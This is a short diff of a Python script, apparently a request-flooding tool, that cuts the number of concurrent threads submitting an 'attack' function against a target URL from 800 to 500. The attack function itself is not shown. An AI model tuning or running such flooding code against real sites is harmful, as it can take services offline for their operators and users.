@@ -128,9 +128,9 @@ if __name__ == "__main__":
     monitor_thread = Thread(target=monitor_requests, daemon=True)
     monitor_thread.start()
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
         try:
-            futures = [executor.submit(attack, url) for _ in range(800)]
+            futures = [executor.submit(attack, url) for _ in range(500)]
             concurrent.futures.wait(futures)
         except KeyboardInterrupt:
             set_flag(2)
